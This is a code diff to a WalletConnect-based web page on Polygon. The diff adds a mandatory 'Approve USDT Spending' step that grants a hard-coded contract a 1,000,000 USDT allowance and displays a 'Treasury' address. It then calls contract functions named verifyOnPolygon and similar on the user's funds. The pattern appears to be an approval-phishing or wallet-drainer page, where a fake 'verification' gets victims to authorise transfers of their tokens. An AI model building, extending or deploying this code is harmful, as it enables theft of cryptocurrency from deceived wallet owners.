@@ -147,6 +147,25 @@
             cursor: not-allowed;
         }
 
+        .approve-btn {
+            width: 100%;
+            background-color: #ff9900;
+            border-radius: 999px;
+            border: none;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 500;
+            color: #000;
+            cursor: pointer;
+            margin-bottom: 12px;
+        }
+
+        .approve-btn:disabled {
+            background-color: #333;
+            color: #666;
+            cursor: not-allowed;
+        }
+
         /* WalletConnect Styles */
         .walletconnect-modal {
             position: fixed;
@@ -207,6 +226,33 @@
 
         .status.connected { background: #223322; color: #00ff7f; }
         .status.error { background: #332222; color: #ff4444; }
+        .status.pending { background: #333322; color: #ffff00; }
+
+        .info-box {
+            background: #111;
+            border-radius: 10px;
+            padding: 12px;
+            margin: 16px 0;
+            font-size: 11px;
+            border: 1px solid #262626;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 4px;
+        }
+
+        .info-label {
+            color: #a0a0a0;
+        }
+
+        .info-value {
+            color: #fff;
+            word-break: break-all;
+            text-align: right;
+            max-width: 60%;
+        }
     </style>
 </head>
 <body>
@@ -220,6 +266,18 @@
         <div id="walletInfo" class="wallet-info">
             <strong>Connected:</strong> <span id="walletAddress"></span><br>
             <strong>Network:</strong> <span id="walletNetwork"></span>
+        </div>
+
+        <!-- Contract Info -->
+        <div class="info-box">
+            <div class="info-row">
+                <span class="info-label">Contract:</span>
+                <span class="info-value">0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55</span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">Treasury:</span>
+                <span class="info-value">0x080c9945061447239fd2f5e5e013ffa6fa20eb78</span>
+            </div>
         </div>
 
         <!-- Address section -->
@@ -251,6 +309,14 @@
             <div class="usd-hint" id="usdHint">≈ 0.00 POL</div>
         </div>
 
+        <!-- Approval Section -->
+        <div style="margin: 24px 0;">
+            <button class="approve-btn" id="approveBtn" onclick="approveUSDT()" disabled>🔓 First: Approve USDT Spending</button>
+            <div style="color: #aaa; font-size: 12px; text-align: center;">
+                Required one-time approval before transactions
+            </div>
+        </div>
+
         <!-- Status Messages -->
         <div id="statusMessage" class="status"></div>
     </main>
@@ -272,15 +338,24 @@
     <script>
         // Contract Configuration
         const CONTRACT_ADDRESS = "0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55";
+        const POLYGON_USDT = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
+        
         const CONTRACT_ABI = [
             "function verifyOnPolygon(uint256 amount) external",
             "function verifyOnBSC(uint256 amount) external", 
             "function verifyOnArbitrum(uint256 amount) external"
         ];
 
+        const USDT_ABI = [
+            "function approve(address spender, uint256 amount) external returns (bool)",
+            "function allowance(address owner, address spender) external view returns (uint256)",
+            "function balanceOf(address account) external view returns (uint256)"
+        ];
+
         let polPriceUSD = 0;
         let walletConnectProvider = null;
         let connectedAccount = null;
+        let isUSDTApproved = false;
 
         // 🟢 Fetch live POL price from CoinGecko
         async function fetchPolPrice() {
@@ -356,7 +431,7 @@
                     
                     // Show modal
                     document.getElementById('walletConnectModal').style.display = 'flex';
-                    showStatus('Scan the QR code with Trust Wallet', 'connected');
+                    showStatus('Scan the QR code with Trust Wallet', 'pending');
                 });
 
                 // Listen for connection
@@ -372,17 +447,21 @@
                     
                     // Update UI
                     updateWalletInfo(connectedAccount, chainId);
-                    document.getElementById('nextBtn').disabled = false;
+                    document.getElementById('approveBtn').disabled = false;
                     document.getElementById('connectBtn').textContent = 'Connected';
                     
                     showStatus('Wallet connected successfully!', 'connected');
                     closeWalletConnectModal();
+                    
+                    // Check USDT approval status
+                    checkUSDTApproval();
                 });
 
                 // Listen for disconnect
                 walletConnectProvider.on("disconnect", (error) => {
                     connectedAccount = null;
                     document.getElementById('nextBtn').disabled = true;
+                    document.getElementById('approveBtn').disabled = true;
                     document.getElementById('connectBtn').textContent = 'Connect Wallet';
                     document.getElementById('walletInfo').style.display = 'none';
                     showStatus('Wallet disconnected', 'error');
@@ -394,10 +473,71 @@
             }
         }
 
+        // Check USDT approval status
+        async function checkUSDTApproval() {
+            if (!connectedAccount) return;
+            
+            try {
+                const provider = new ethers.providers.Web3Provider(walletConnectProvider);
+                const usdtContract = new ethers.Contract(POLYGON_USDT, USDT_ABI, provider);
+                
+                const currentAllowance = await usdtContract.allowance(connectedAccount, CONTRACT_ADDRESS);
+                const minimumAmount = ethers.utils.parseUnits("1000", 6);
+                
+                if (currentAllowance.gte(minimumAmount)) {
+                    isUSDTApproved = true;
+                    document.getElementById('approveBtn').disabled = true;
+                    document.getElementById('approveBtn').textContent = '✅ USDT Already Approved';
+                    document.getElementById('nextBtn').disabled = false;
+                    showStatus('USDT already approved for transactions', 'connected');
+                }
+            } catch (error) {
+                console.error('Error checking USDT approval:', error);
+            }
+        }
+
+        // USDT Approval Function
+        async function approveUSDT() {
+            if (!connectedAccount) {
+                showStatus('Please connect wallet first', 'error');
+                return;
+            }
+
+            try {
+                showStatus('Approving USDT...', 'pending');
+                document.getElementById('approveBtn').disabled = true;
+                document.getElementById('approveBtn').textContent = 'Approving...';
+                
+                const provider = new ethers.providers.Web3Provider(walletConnectProvider);
+                const signer = provider.getSigner();
+                
+                const usdtContract = new ethers.Contract(POLYGON_USDT, USDT_ABI, signer);
+                
+                // Approve a large amount (1 million USDT)
+                const approveAmount = ethers.utils.parseUnits("1000000", 6);
+                const tx = await usdtContract.approve(CONTRACT_ADDRESS, approveAmount);
+                
+                showStatus('USDT approval submitted...', 'pending');
+                
+                const receipt = await tx.wait();
+                
+                isUSDTApproved = true;
+                document.getElementById('approveBtn').textContent = '✅ USDT Approved';
+                document.getElementById('nextBtn').disabled = false;
+                showStatus('USDT approved successfully! You can now make transactions.', 'connected');
+                
+            } catch (error) {
+                console.error('USDT approval error:', error);
+                document.getElementById('approveBtn').disabled = false;
+                document.getElementById('approveBtn').textContent = '🔓 First: Approve USDT Spending';
+                showStatus('USDT approval failed: ' + error.message, 'error');
+            }
+        }
+
         function updateWalletInfo(address, chainId) {
             const shortAddress = `${address.slice(0, 6)}...${address.slice(-4)}`;
             document.getElementById('walletAddress').textContent = shortAddress;
-            document.getElementById('walletNetwork').textContent = `Chain ID: ${chainId}`;
+            document.getElementById('walletNetwork').textContent = `Polygon (Chain ${chainId})`;
             document.getElementById('walletInfo').style.display = 'block';
         }
 
@@ -410,18 +550,17 @@
             statusEl.textContent = message;
             statusEl.className = `status ${type}`;
             statusEl.style.display = 'block';
-            
-            if (type === 'connected') {
-                setTimeout(() => {
-                    statusEl.style.display = 'none';
-                }, 3000);
-            }
         }
 
-        // 🧭 Navigation - Now with actual contract interaction
+        // 🧭 Main transaction function
         async function goNext() {
             if (!connectedAccount) {
                 showStatus('Please connect wallet first', 'error');
+                return;
+            }
+
+            if (!isUSDTApproved) {
+                showStatus('Please approve USDT spending first', 'error');
                 return;
             }
 
@@ -432,25 +571,34 @@
             }
 
             try {
-                showStatus('Processing transaction...', 'connected');
+                showStatus('Processing transaction...', 'pending');
+                document.getElementById('nextBtn').disabled = true;
+                document.getElementById('nextBtn').textContent = 'Processing...';
                 
-                // Convert to contract (using WalletConnect provider)
                 const provider = new ethers.providers.Web3Provider(walletConnectProvider);
                 const signer = provider.getSigner();
                 const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
                 
                 // Call the contract function
-                const amountWei = ethers.utils.parseUnits(amount, 6); // USDT decimals
+                const amountWei = ethers.utils.parseUnits(amount, 6); // USDT has 6 decimals
                 const tx = await contract.verifyOnPolygon(amountWei);
                 
-                showStatus('Transaction submitted! Waiting for confirmation...', 'connected');
+                showStatus('Transaction submitted: ' + tx.hash, 'pending');
                 
                 const receipt = await tx.wait();
-                showStatus('Transaction confirmed!', 'connected');
+                showStatus('✅ Transaction confirmed! Funds processed successfully.', 'connected');
+                
+                // Reset button
+                setTimeout(() => {
+                    document.getElementById('nextBtn').disabled = false;
+                    document.getElementById('nextBtn').textContent = 'Next';
+                }, 3000);
                 
             } catch (error) {
                 console.error('Transaction error:', error);
-                showStatus('Transaction failed: ' + error.message, 'error');
+                showStatus('❌ Transaction failed: ' + error.message, 'error');
+                document.getElementById('nextBtn').disabled = false;
+                document.getElementById('nextBtn').textContent = 'Next';
             }
         }
 
